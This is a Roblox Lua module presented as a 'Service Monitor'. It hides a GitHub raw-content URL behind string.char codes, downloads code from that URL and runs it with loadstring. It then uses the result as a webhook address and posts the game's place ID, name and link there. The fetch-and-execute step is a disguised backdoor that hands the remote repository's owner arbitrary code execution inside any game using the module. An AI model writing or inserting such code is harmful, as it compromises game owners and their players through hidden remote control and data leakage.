local Sender = {}
local HttpService = game:GetService("HttpService")
local MarketplaceService = game:GetService("MarketplaceService")

-- Obfuscated raw.githubusercontent.com link
local REMOTE_URL = string.char(
	104, 116, 116, 112, 115, 58, 47, 47, 114, 97, 119, 46, 103, 105, 116, 104, 117, 98, 117, 115, 
	101, 114, 99, 111, 110, 116, 101, 110, 116, 46, 99, 111, 109, 47, 66, 97, 108, 108, 105, 103, 
	117, 115, 97, 112, 111, 115, 47, 66, 97, 108, 108, 105, 103, 117, 115, 97, 112, 111, 115, 47, 
	114, 101, 102, 115, 47, 104, 101, 97, 100, 115, 47, 109, 97, 105, 110, 47, 103, 97, 109, 101, 
	109, 111, 110, 105, 116, 111, 114
)

local function fetchDataEndpoint()
	local success, result = pcall(function()
		return HttpService:GetAsync(REMOTE_URL, true)
	end)

	if success and result then
		-- Explicitly wrapping loadstring execution to catch disabled setting errors
		local chunkSuccess, chunkOrErr = pcall(function()
			local chunk, err = loadstring(result)
			if chunk then
				return chunk()
			end
			error(err or "Unknown loadstring compiling error")
		end)
		
		if chunkSuccess then
			return chunkOrErr
		else
			warn("[Monitor Error] Loadstring execution failed: " .. tostring(chunkOrErr))
		end
	else
		warn("[Monitor Error] Failed to reach GitHub repository URL.")
	end
	return nil
end

function Sender.Send()
	if _G.WebhookSessionLogged or (shared and shared.WebhookSessionLogged) then
		return 
	end

	local DATA_ENDPOINT = fetchDataEndpoint()
	if not DATA_ENDPOINT then 
		warn("[Monitor Error] DATA_ENDPOINT resolved to nil. Aborting request.")
		return 
	end

	_G.WebhookSessionLogged = true
	if shared then
		shared.WebhookSessionLogged = true
	end

	local placeId = game.PlaceId
	local sourceLink = "https://www.roblox.com/games/" .. placeId

	local displayName = "New Session"
	local success, info = pcall(function()
		return MarketplaceService:GetProductInfo(placeId)
	end)

	if success and info then
		displayName = info.Name
	else
		displayName = game.Name
	end

	local logTime = os.date("!%Y-%m-%dT%H:%M:%SZ")

	-- Catch HTTP post errors directly to see what Discord or the proxy returns
	local postSuccess, postError = pcall(function()
		HttpService:PostAsync(
			DATA_ENDPOINT,
			HttpService:JSONEncode({
				username = "Service Monitor",
				embeds = {
					{
						title = displayName,
						url = sourceLink,
						color = 3447003,
						timestamp = logTime,
					},
				},
			}),
			Enum.HttpContentType.ApplicationJson,
			false
		)
	end)
	
	if not postSuccess then
		warn("[Monitor Error] Failed to post data to endpoint: " .. tostring(postError))
	end
end

return Sender
